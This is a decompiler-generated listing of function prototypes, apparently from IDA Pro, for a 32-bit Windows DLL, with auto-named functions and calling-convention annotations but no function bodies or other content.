// int *__usercall sub_1000A531@<eax>(int *a1@<eax>);
// int *__userpurge sub_1000A588@<eax>(int *a1@<eax>, __int16 a2);
int __stdcall sub_1000A60A(int a1, int pExceptionObject, int a3, unsigned int a4);
// int *__userpurge sub_1000A84F@<eax>(int *a1@<eax>, int a2@<ebx>, int pExceptionObject, unsigned int a4);
// int *__usercall sub_1000A8F8@<eax>(unsigned int a1@<eax>, int *a2@<ecx>);
// BOOL __usercall sub_1000A959@<eax>(int a1@<eax>, int a2@<ecx>);
// int __userpurge sub_1000A974@<eax>(int a1@<ecx>, int a2@<esi>, wchar_t a3);
// int __userpurge sub_1000A996@<eax>(int a1@<esi>, wchar_t a2);
// int __userpurge sub_1000A9B5@<eax>(int a1@<eax>, int a2@<esi>, int a3);
// int __usercall sub_1000AA32@<eax>(int a1@<eax>, int a2@<ecx>);
_DWORD *__thiscall sub_1000AA43(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000AA96(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000AAE9(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000AB44(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000AB9F(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1000AC14(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_1000AC89(_DWORD *this);
int __thiscall sub_1000ACAE(void *this, int a2);
int *__thiscall sub_1000ACDC(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1000AD44(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000ADAC(void *this, int a2);
void __thiscall sub_1000ADE4(void *this, int a2, int a3);
void __thiscall sub_1000AE1F(void *this, int a2);
int __thiscall sub_1000AE57(void *this, int a2);
int __thiscall sub_1000AE93(void *this, int a2);
void __thiscall sub_1000AECF(void *this);
// int __usercall sub_1000AF23@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1000AF54(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AF73(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AF93(_DWORD *Block, char a2);
// int __usercall sub_1000AFB8@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1000AFF8(void *this, _DWORD *a2, int a3);
void __thiscall sub_1000B02C(_DWORD *this);
bool __thiscall sub_1000B051(int this);
BOOL __thiscall sub_1000B068(_DWORD *this);
int __thiscall sub_1000B072(int this);
int __thiscall sub_1000B0AD(int this);
int __thiscall sub_1000B0E3(_DWORD *this);
int __thiscall sub_1000B10B(int this);
int __thiscall sub_1000B146(int this, int a2);
_DWORD *__thiscall sub_1000B162(void *this, _DWORD *a2, int a3);
void __thiscall sub_1000B196(_DWORD *this);
bool __thiscall sub_1000B1BB(int this);
BOOL __thiscall sub_1000B1D2(_DWORD *this);
int __thiscall sub_1000B1DC(int this);
int __thiscall sub_1000B217(int this);
int __thiscall sub_1000B24D(_DWORD *this);
int __thiscall sub_1000B275(int this);
int __thiscall sub_1000B2B0(int this, int a2);
_DWORD *__thiscall sub_1000B2CC(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000B2EB(_DWORD *Block, char a2);
LONG __stdcall sub_1000B345(int *a1);
_DWORD *__stdcall sub_1000B37F(_DWORD *a1);
void **__thiscall sub_1000B3B1(void **this, void **a2);
void __thiscall sub_1000B3F3(int this);
int __thiscall sub_1000B442(_DWORD *this);
int __thiscall sub_1000B446(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1000B4A3(int *this, int a2);
int __thiscall sub_1000B4BE(_DWORD *this, unsigned int a2);
int __thiscall sub_1000B50A(_DWORD *this, int a2);
int __thiscall sub_1000B52B(_DWORD *this, int a2);
void __thiscall sub_1000B54C(_DWORD *this, unsigned int a2);
int __thiscall sub_1000B571(void **this);
BOOL __thiscall sub_1000B595(void *this);
int __thiscall sub_1000B5A0(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1000B5E2(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1000B654(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1000B67C(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1000B68F(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1000B6ED(_DWORD *this);
// _DWORD *__userpurge sub_1000B7B7@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000B7F6(void *this);
// _DWORD *__userpurge sub_1000B83B@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000B87A(void *this);
void *__thiscall sub_1000B8AB(void *Block, char a2);
_DWORD *__stdcall sub_1000B8CA(_DWORD *a1);
// void *__usercall sub_1000B8F5@<eax>(_DWORD *a1@<esi>);
// void __usercall sub_1000B92A(int a1@<esi>);
// void __usercall sub_1000B964(int a1@<esi>);
_DWORD *__stdcall sub_1000B9A0(_DWORD *a1, wchar_t *Source);
int *__thiscall sub_1000B9D0(int *Block, char a2);
_DWORD *__stdcall sub_1000B9EF(_DWORD *a1);
_DWORD *__stdcall sub_1000BA21(_DWORD *a1, int a2);
void __thiscall sub_1000BA51(int *this);
_DWORD *__stdcall sub_1000BA75(_DWORD *a1, int a2, int a3);
void __thiscall sub_1000BADB(int *this);
int *__thiscall sub_1000BB2D(int *Block, char a2);
// int __usercall sub_1000BB4C@<eax>(int a1@<ebx>);
// unsigned int __usercall sub_1000BD68@<eax>(int a1@<eax>);
void __cdecl sub_1000BDA7(int a1, unsigned int a2);
int __cdecl sub_1000BDCC(int a1);
int __cdecl sub_1000BE16(int a1);
// LONG __usercall sub_1000BE8E@<eax>(int a1@<esi>);
_DWORD *__stdcall sub_1000BEC2(_DWORD *a1, int a2);
int __thiscall sub_1000BF21(int this);
int __thiscall sub_1000BF79(int this);
int __thiscall sub_1000BFEA(_DWORD **this);
int __thiscall sub_1000BFF6(_DWORD **this);
int __thiscall sub_1000BFFE(_DWORD **this);
int __thiscall sub_1000C00A(_DWORD **this);
void *__thiscall sub_1000C012(_DWORD **this, void *a2);
// _DWORD *__usercall sub_1000C043@<eax>(_DWORD *a1@<esi>);
// _DWORD *__usercall sub_1000C093@<eax>(_DWORD *a1@<esi>);
// void __usercall sub_1000C0E3(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_1000C126(_DWORD *a1@<ecx>, int a2@<edi>);
int __stdcall sub_1000C169(int a1, void *a2, void *a3);
void *__thiscall sub_1000C1A9(void *Block, char a2);
int __stdcall sub_1000C1C9(int a1, int a2);
void __stdcall sub_1000C20C(int a1);
// void *__userpurge sub_1000C25C@<eax>(void *result@<eax>, int a2@<esi>, void *Src);
// int __userpurge sub_1000C28D@<eax>(void *a1@<ebx>, int a2, void *a3);
int *__thiscall sub_1000C2F3(int *Block, char a2);
// int __userpurge sub_1000C312@<eax>(int a1@<ebx>, int a2);
// int __userpurge sub_1000C38D@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4, void *pExceptionObject);
// int __userpurge sub_1000C3F3@<eax>(_DWORD *a1@<ebx>, int a2);
// int __usercall sub_1000C439@<eax>(int *a1@<ebx>, int a2@<esi>);
LONG __thiscall sub_1000C45D(int *this);
// void __usercall sub_1000C485(int a1@<ebx>);
// int __usercall sub_1000C50A@<eax>(_DWORD *a1@<eax>);
int __thiscall sub_1000C52E(_DWORD *this);
// int __userpurge sub_1000C55B@<eax>(int a1@<eax>, int a2);
bool __fastcall sub_1000C577(_DWORD *a1, _DWORD *a2);
int __thiscall sub_1000C5DF(_DWORD *this, int a2);
// int __usercall sub_1000C6CE@<eax>(_DWORD *a1@<ebx>, int a2, _DWORD *a3);
// int __userpurge sub_1000C709@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4);
// int __userpurge sub_1000C73C@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4);
int __thiscall sub_1000C77C(_DWORD *this, int a2);
// _BYTE *__userpurge sub_1000C79D@<eax>(_DWORD *a1@<esi>, int a2, int Src);
__int16 __thiscall sub_1000C7D0(_DWORD *this);
// _BYTE *__userpurge sub_1000C7EE@<eax>(_DWORD *a1@<esi>, __int16 Src);
// _BYTE *__usercall sub_1000C81E@<eax>(_DWORD *a1@<esi>);
// int *__userpurge sub_1000C84C@<eax>(int *a1@<eax>, int *a2@<ecx>, void *Block);
LONG __stdcall sub_1000C875(int *a1);
// int *__usercall sub_1000C8A9@<eax>(int *a1@<eax>, int *a2@<edi>);
// LONG __userpurge sub_1000C8D4@<eax>(int *a1@<esi>, void *Block);
// _DWORD *__userpurge sub_1000C92B@<eax>(struct _SECURITY_ATTRIBUTES *a1@<ebx>, _DWORD *a2);
void *__thiscall sub_1000C9C0(void *Block, char a2);
int __stdcall sub_1000C9E0(int a1);
void __stdcall sub_1000CA15(int a1);
_DWORD *__thiscall sub_1000CA5F(_DWORD *Block, char a2);
int __stdcall sub_1000CA7E(int a1, unsigned int a2, unsigned int a3);
int __thiscall sub_1000CAF2(_DWORD **this);
void *__thiscall sub_1000CAFA(void *this, void *a2);
void __stdcall sub_1000CB2C(_DWORD *a1, int a2, int a3);
_DWORD *__stdcall sub_1000CB74(_DWORD *a1, int a2);
void __thiscall sub_1000CBCE(_DWORD *this);
_DWORD *__thiscall sub_1000CBE0(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1000CC4F(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1000CCB0(_DWORD *this, char a2);
int __stdcall sub_1000CCDD(int a1);
char *__thiscall sub_1000CD06(_DWORD *this, char a2);
void __thiscall sub_1000CD28(_DWORD *this);
void __stdcall sub_1000CD3D(int a1, int a2);
void __stdcall sub_1000CD7F(volatile LONG *a1, volatile LONG *lpAddend, volatile LONG *a3);
LONG __thiscall sub_1000CDEB(int *this, int a2, int a3);
LONG __thiscall sub_1000CE4F(int *this, int a2, int a3);
LONG __thiscall sub_1000CEA9(int *this, int a2, int a3);
LONG __thiscall sub_1000CF03(int *this, int a2, int a3);
void __thiscall sub_1000CF5D(int *this, int a2, int a3, int a4);
LONG __thiscall sub_1000CFA7(int *this, int a2, int a3, int a4);
LONG __thiscall sub_1000D001(int *this, int a2, int a3, int a4, int a5, int a6, int a7);
LONG __thiscall sub_1000D04B(int *this, int a2, int a3, int a4, int a5, void *Block, int a7, _DWORD **a8);
bool __thiscall sub_1000D0DE(void *this, int a2);
char __thiscall sub_1000D122(void *this, int a2);
__int16 __thiscall sub_1000D162(void *this, int a2);
int __thiscall sub_1000D1A2(void *this, int a2);
int __thiscall sub_1000D1E2(void *this, int a2, int a3);
_DWORD *__thiscall sub_1000D219(void *this, _DWORD *a2, int a3);
LONG __thiscall sub_1000D263(void *this, int a2);
int __thiscall sub_1000D2A2(int *this, int a2, int a3, volatile LONG *a4);
int __thiscall sub_1000D33A(int *this, int a2);
bool __thiscall sub_1000D447(int *this, int a2);
int **__stdcall sub_1000D4F2(int *a1, int **a2, int a3, int a4, void *Block);
_DWORD *__stdcall sub_1000D5EB(int *a1, _DWORD *a2, int a3, int a4, void *Block);
_DWORD *__thiscall sub_1000D692(int *this, _DWORD *a2, int a3);
void __stdcall sub_1000D755(int *a1, int a2, _DWORD *a3, volatile LONG *lpAddend, int *a5);
int __thiscall sub_1000D7E2(int *this, int a2, int Src);
int *__thiscall sub_1000D8A8(int this, int *a2);
int __thiscall sub_1000D8E5(int *this, int a2);
_DWORD *__thiscall sub_1000D968(int *this, _DWORD *a2, int a3);
int __thiscall sub_1000DA26(int this);
void __thiscall sub_1000DA5A(int this);
int __thiscall sub_1000DAE1(int this);
// _DWORD *__userpurge sub_1000DB0D@<eax>(_DWORD *a1@<esi>, int a2);
void __stdcall sub_1000DB4C(void **a1);
// int __usercall sub_1000DB7A@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
void __thiscall sub_1000DBA8(void *this);
// _DWORD *__usercall sub_1000DBD3@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__userpurge sub_1000DC03@<eax>(_DWORD *a1@<esi>, int a2);
void __stdcall sub_1000DC42(void **a1);
// int __usercall sub_1000DC70@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
void __thiscall sub_1000DC9E(void *this);
// void __usercall sub_1000DCE6(void **a1@<eax>);
// void __usercall sub_1000DD24(int a1@<esi>);
// void __usercall sub_1000DD5E(void **a1@<eax>);
// void __usercall sub_1000DD8A(int a1@<esi>);
void *__stdcall sub_1000DDB2(void *Block);
void *__stdcall sub_1000DDCD(void *Block);
LONG __stdcall sub_1000DDE8(int a1);
void __stdcall sub_1000DE0B(int a1);
LPVOID sub_1000DE59();
void __cdecl sub_1000DE86(LPVOID lpTlsValue);
_DWORD *__thiscall sub_1000DEB4(_DWORD *this, int a2);
_DWORD *__thiscall sub_1000DED0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000DEEF(_DWORD *this);
void __thiscall sub_1000DF1A(_DWORD *this);
_DWORD *__stdcall sub_1000DF56(_DWORD *a1);
void __thiscall sub_1000DF88(_DWORD *this);
_DWORD *__stdcall sub_1000DFAC(_DWORD *a1);
_DWORD *__thiscall sub_1000DFDA(_DWORD *Block, char a2);
void __thiscall sub_1000DFF9(_DWORD *this);
_DWORD *__stdcall sub_1000E01D(_DWORD *a1);
_DWORD *__stdcall sub_1000E072(_DWORD *a1);
_DWORD *__thiscall sub_1000E0A0(_DWORD *Block, char a2);
void __thiscall sub_1000E0BF(_DWORD *this);
_DWORD *__stdcall sub_1000E0E3(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1000E117(_DWORD *Block, char a2);
void __thiscall sub_1000E136(_DWORD *this);
_DWORD *__stdcall sub_1000E15A(_DWORD *a1);
void __thiscall sub_1000E188(_DWORD *this);
_DWORD *__stdcall sub_1000E1AC(_DWORD *a1);
_DWORD *__stdcall sub_1000E201(_DWORD *a1);
_DWORD *__thiscall sub_1000E22F(_DWORD *Block, char a2);
void __thiscall sub_1000E24E(_DWORD *this);
_DWORD *__stdcall sub_1000E272(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1000E2A6(_DWORD *Block, char a2);
void __thiscall sub_1000E2C5(_DWORD *this);
_DWORD *__thiscall sub_1000E2E3(_DWORD *this, int a2);
int __stdcall sub_1000E349(int a1);
_DWORD *__thiscall sub_1000E378(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000E39E(_DWORD *Block, char a2);
void __thiscall sub_1000E3BE(_DWORD *this);
_BYTE *__thiscall sub_1000E3E4(_BYTE *this, _DWORD *a2, int pExceptionObject);
char sub_1000E44A();
int __stdcall sub_1000E44D(int a1);
_DWORD *__thiscall sub_1000E47C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000E4A2(_DWORD *Block, char a2);
void __thiscall sub_1000E4C2(_DWORD *this);
_BYTE *__thiscall sub_1000E4E8(_BYTE *this, _DWORD *a2, int pExceptionObject);
char sub_1000E54E();
void __thiscall sub_1000E551(_DWORD *this);
_DWORD *__thiscall sub_1000E576(_DWORD *Block, char a2);
int sub_1000E595();
_DWORD *__stdcall sub_1000E599(_DWORD *a1, void *a2, void *a3);
_DWORD *__thiscall sub_1000E601(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1000E621(_DWORD *a1);
_DWORD *__thiscall sub_1000E653(_DWORD *Block, char a2);
LONG __thiscall sub_1000E673(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000E6C4(void *this, _DWORD *a2, _DWORD *a3);
int sub_1000E72A();
int __stdcall sub_1000E72D(int a1, int a2, int a3);
void *__thiscall sub_1000E804(void *Block, char a2);
void __thiscall sub_1000E823(int this);
int __thiscall sub_1000E89F(void *this, _BYTE *a2);
int __thiscall sub_1000E8CB(int this, int a2);
_DWORD *__stdcall sub_1000EA5A(_DWORD *a1);
void __thiscall sub_1000EAAE(_DWORD *this);
_DWORD *__thiscall sub_1000EAC0(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1000EB2F(_DWORD *this, char a2);
int __stdcall sub_1000EB5C(int a1);
int __thiscall sub_1000EB85(_DWORD **this, unsigned int a2);
int __thiscall sub_1000EBBD(_DWORD **this, unsigned int a2);
size_t __thiscall sub_1000EBDA(int *this, _DWORD *a2);
int __thiscall sub_1000EC65(_DWORD *this);
BOOL __thiscall sub_1000EC8A(_DWORD *this);
// LONG __usercall sub_1000ECA7@<eax>(_DWORD **a1@<esi>);
char sub_1000ECFC();
int __stdcall sub_1000ED1A(int a1, int a2, int a3);
_BYTE *__thiscall sub_1000EDB8(_BYTE *Block, char a2);
int __stdcall sub_1000EDD7(int, int, volatile LONG *lpAddend); // idb
void __thiscall sub_1000EE45(_BYTE *this);
int __thiscall sub_1000EE9D(_DWORD **this, _BYTE *a2);
int __thiscall sub_1000EEC0(_DWORD **this, int a2);
int __thiscall sub_1000EEDB(_DWORD **this);
BOOL __thiscall sub_1000EEF7(void *this);
int __thiscall sub_1000EF02(_BYTE *this);
int __thiscall sub_1000EF22(_DWORD **this);
int __thiscall sub_1000EF2A(_DWORD **this, int a2, int a3);
char sub_1000EF54();
_BYTE *__thiscall sub_1000EF5A(_DWORD *this, _BYTE *a2, char a3, unsigned __int8 pExceptionObject);
void __thiscall sub_1000F027(int *this);
int *__stdcall sub_1000F04B(int *a1, int a2);
char __cdecl sub_1000F084(int a1);
_DWORD *__cdecl sub_1000F0FB(_DWORD *a1, int a2);
BOOL __thiscall sub_1000F14D(_DWORD *this);
BOOL __thiscall sub_1000F17D(int this);
// int *__usercall sub_1000F1C5@<eax>(int a1@<eax>, int *a2@<esi>);
bool __thiscall sub_1000F1E1(_DWORD *this);
_DWORD *__thiscall sub_1000F212(_DWORD *Block, char a2);
// bool __usercall sub_1000F231@<al>(int a1@<esi>);
// BOOL __usercall sub_1000F24B@<eax>(int a1@<eax>);
_DWORD *__stdcall sub_1000F25E(_DWORD *a1, void *a2, char a3);
int *__thiscall sub_1000F295(int *Block, char a2);
_DWORD *__stdcall sub_1000F2B5(_DWORD *a1, void *a2, char a3);
int *__thiscall sub_1000F2E8(int *Block, char a2);
void __thiscall sub_1000F307(int *this);
DWORD __thiscall sub_1000F32C(_DWORD *this);
char __thiscall sub_1000F368(_DWORD *this, DWORD dwExitCode);
int __stdcall sub_1000F3B5(int, void *pExceptionObject); // idb
int __thiscall sub_1000F462(_DWORD *this);
bool __thiscall sub_1000F485(_DWORD *this);
_DWORD *__thiscall sub_1000F4BF(void *this, _DWORD *a2, DWORD a3);
DWORD __thiscall sub_1000F4FF(_DWORD *this);
// _DWORD *__usercall sub_1000F530@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess);
// _DWORD *__userpurge sub_1000F58B@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__userpurge sub_1000F5B8@<eax>(int a1@<edi>, _DWORD *a2);
_DWORD *__stdcall sub_1000F5EC(_DWORD *a1, int a2);
int *__thiscall sub_1000F61F(int *Block, char a2);
_DWORD *__thiscall sub_1000F63E(_DWORD *this, _DWORD *a2, char a3, DWORD DesiredAccess);
LONG __stdcall sub_1000F6BC(int *a1);
// LONG __usercall sub_1000F6F0@<eax>(int *a1@<esi>);
int sub_1000F73F();
int sub_1000F74A();
int __thiscall sub_1000F755(void *this);
BOOL sub_1000F78F();
BOOL sub_1000F79B();
bool sub_1000F8D3();
// char __usercall sub_1000F8E3@<al>(_DWORD *a1@<esi>);
// char __usercall sub_1000F92C@<al>(int *a1@<edx>, _DWORD *a2@<ecx>, int *a3@<edi>);
void sub_1000FAE0();
// char __usercall sub_1000FB3C@<al>(_DWORD *a1@<ebx>);
void sub_1000FC57();
void __stdcall sub_1000FC7D(int *a1);
int *__thiscall sub_1000FCCB(int *Block, char a2);
void __stdcall sub_1000FCEB(int *a1);
int __stdcall sub_1000FD19(int a1);
char sub_1000FD49();
bool sub_1000FF1B();
// bool __usercall sub_1000FF9F@<al>(int a1@<edi>);
_DWORD *__stdcall sub_10010099(_DWORD *a1, _DWORD *a2);
void __stdcall sub_100100D0(int a1);
// int __usercall sub_100100F8@<eax>(int a1@<ecx>, int a2@<esi>);
void __thiscall sub_10010129(_DWORD *this);
int *__thiscall sub_1001014E(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100101B6(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1001021E(void *this, int a2);
void __thiscall sub_10010256(void *this, int a2, int a3);
void __thiscall sub_10010291(void *this, int a2);
int __thiscall sub_100102C9(void *this, int a2);
int __thiscall sub_10010305(void *this, int a2);
void __thiscall sub_10010341(void *this);
_DWORD *__stdcall sub_10010390(_DWORD *a1);
void __thiscall sub_100103C7(_DWORD *this);
void *__thiscall sub_1001041E(void *this, int a2);
void *__thiscall sub_10010433(void *this, int a2);
int __thiscall sub_10010448(_DWORD *this);
_DWORD *__thiscall sub_1001044C(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100104A2(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100104F8(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1001054E(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100105A4(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100105F7(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001064A(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100106A5(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10010700(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_10010775(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_100107EA(_DWORD *this);
int *__thiscall sub_1001080F(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10010877(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_100108DF(void *this, int a2);
void __thiscall sub_10010917(void *this, int a2, int a3);
void __thiscall sub_10010952(void *this, int a2);
int __thiscall sub_1001098A(void *this, int a2);
int __thiscall sub_100109C6(void *this, int a2);
void __thiscall sub_10010A02(void *this);
int *__thiscall sub_10010A51(void *this);
_DWORD *__thiscall sub_10010A88(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10010AA7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10010AC7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10010AE7(_DWORD *Block, char a2);
int *__stdcall sub_10010B06(int *Block);
_DWORD *__thiscall sub_10010B21(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10010B40(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10010B60(_DWORD *Block, char a2);
void *__thiscall sub_10010B80(void *Block, char a2);
int *__stdcall sub_10010B9F(int *Block);
void __stdcall sub_10010BBA(int *a1);
_DWORD *__stdcall sub_10010BDB(_DWORD *a1);
// int __usercall sub_10010C0B@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10010C4F@<eax>(int a1@<ecx>, int a2@<esi>);
// void __usercall sub_10010C80(int a1@<ecx>, int a2@<edi>);
// int __usercall sub_10010CE1@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10010D25@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10010D56(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10010D90(_DWORD *this);
BOOL __thiscall sub_10010DB5(_DWORD *this);
BOOL __thiscall sub_10010DBE(_DWORD *this);
int __thiscall sub_10010DC7(_DWORD *this);
int __thiscall sub_10010DEB(_DWORD *this);
int __thiscall sub_10010E18(_DWORD *this);
int *__thiscall sub_10010E45(int this);
_DWORD *__thiscall sub_10010EBB(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10010F40(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10010F7A(_DWORD *this);
BOOL __thiscall sub_10010F9F(_DWORD *this);
BOOL __thiscall sub_10010FA8(_DWORD *this);
int __thiscall sub_10010FB1(_DWORD *this);
int __thiscall sub_10010FD5(_DWORD *this);
int __thiscall sub_10011002(_DWORD *this);
int *__thiscall sub_1001102F(int this);
_DWORD *__thiscall sub_100110A5(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1001112A(void *this, _DWORD *a2, int a3);
void __thiscall sub_1001115E(_DWORD *this);
bool __thiscall sub_10011183(int this);
BOOL __thiscall sub_1001119A(_DWORD *this);
int __thiscall sub_100111A4(int this);
int __thiscall sub_100111DF(int this);
int __thiscall sub_10011215(_DWORD *this);
int __thiscall sub_1001123D(int this);
int __thiscall sub_10011278(int this, int a2);
_DWORD *__thiscall sub_10011294(void *this, _DWORD *a2, int a3);
void __thiscall sub_100112C8(_DWORD *this);
bool __thiscall sub_100112ED(int this);
BOOL __thiscall sub_10011304(_DWORD *this);
int __thiscall sub_1001130E(int this);
int __thiscall sub_10011349(int this);
int __thiscall sub_1001137F(_DWORD *this);
int __thiscall sub_100113A7(int this);
int __thiscall sub_100113E2(int this, int a2);
_DWORD *__thiscall sub_100113FE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001141D(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1001146B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001148A(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100114A9(_DWORD *Block, char a2);
int *__thiscall sub_100114C8(int *Block, char a2);
// _DWORD *__userpurge sub_100114E7@<eax>(int a1@<edi>, _DWORD *a2);
int *__thiscall sub_10011514(int *Block, char a2);
_DWORD *__stdcall sub_10011560(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
void __thiscall sub_100115C6(void *this);
_DWORD *__stdcall sub_100115F1(_DWORD *a1);
void **__thiscall sub_10011626(void **this, void **a2);
void __thiscall sub_10011668(int this);
int __thiscall sub_100116B7(_DWORD *this);
int __thiscall sub_100116BB(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10011718(int *this, int a2);
int __thiscall sub_10011733(_DWORD *this, unsigned int a2);
int __thiscall sub_1001177F(_DWORD *this, int a2);
int __thiscall sub_100117A0(_DWORD *this, int a2);
void __thiscall sub_100117C1(_DWORD *this, unsigned int a2);
int __thiscall sub_100117E6(void **this);
BOOL __thiscall sub_1001180A(void *this);
int __thiscall sub_10011815(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10011857(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_100118C9(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_100118F1(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10011904(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_10011962(_DWORD *this);
// int __userpurge sub_10011A18@<eax>(__int32 a1@<eax>, int a2);
void __thiscall sub_10011A2D(void *this);
// _DWORD *__userpurge sub_10011A72@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10011AB1(void *this);
// _DWORD *__userpurge sub_10011AF6@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10011B35(void *this);
// _DWORD *__userpurge sub_10011B7A@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10011BB9(void *this);
// _DWORD *__userpurge sub_10011BFE@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10011C3D(void *this);
void *__thiscall sub_10011C6E(void *Block, char a2);
_DWORD *__stdcall sub_10011C8D(_DWORD *a1);
// void __usercall sub_10011CCA(int a1@<esi>);
// void *__usercall sub_10011CF2@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
// int __usercall sub_10011D12@<eax>(__int32 a1@<eax>);
// void __usercall sub_10011D89(int a1@<esi>);
// void __usercall sub_10011DC3(int a1@<esi>);
// void __usercall sub_10011DFD(int a1@<esi>);
// void __usercall sub_10011E37(int a1@<esi>);
// void __usercall sub_10011E71(int a1@<esi>);
// int __usercall sub_10011EED@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_10011F0C(_DWORD *Block, char a2);
void (__cdecl *__thiscall sub_10011F2B(_DWORD *this))(unsigned int, struct _EXCEPTION_POINTERS *);
// void (__cdecl *__usercall sub_10011F5C@<eax>(int a1@<esi>))(unsigned int, struct _EXCEPTION_POINTERS *);
void __cdecl __noreturn sub_10011F70(unsigned int a1, struct _EXCEPTION_POINTERS *a2);
_DWORD *__thiscall sub_10011F94(_DWORD *this, int a2);
BOOL __stdcall sub_10011FCC(int a1);
_DWORD *__stdcall sub_10011FE0(_DWORD *a1);
_DWORD *__thiscall sub_1001200E(_DWORD *Block, char a2);
void __thiscall sub_1001202D(_DWORD *this);
int __stdcall sub_10012051(int a1, int a2, _DWORD *a3, _DWORD *Block);
void *__thiscall sub_10012299(void *Block, char a2);
void __stdcall sub_100122B8(int a1);
void __thiscall sub_100122DB(int this);
void __stdcall sub_100123A7(_DWORD *a1);
_DWORD *__stdcall sub_1001241E(int a1, _DWORD *a2);
// int sub_100126AF(void); weak
int __cdecl sub_100126D5(int a1);
_DWORD *__thiscall sub_10012737(_DWORD *this, _DWORD *a2);
int __stdcall sub_100127F0(int a1);
_DWORD *__stdcall sub_10012817(_DWORD *a1, _DWORD *a2);
// int sub_1001287F(void); weak
// _DWORD *__userpurge sub_100128A2@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__usercall sub_100128B4@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__usercall sub_100128D9@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_10012914(void *this);
// _DWORD *__usercall sub_10012957@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_10012992(void *this);
// _DWORD *__userpurge sub_100129BD@<eax>(int a1@<edi>, _DWORD *a2);
// void __usercall sub_100129D5(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10012A18(_DWORD *a1@<ecx>, int a2@<edi>);
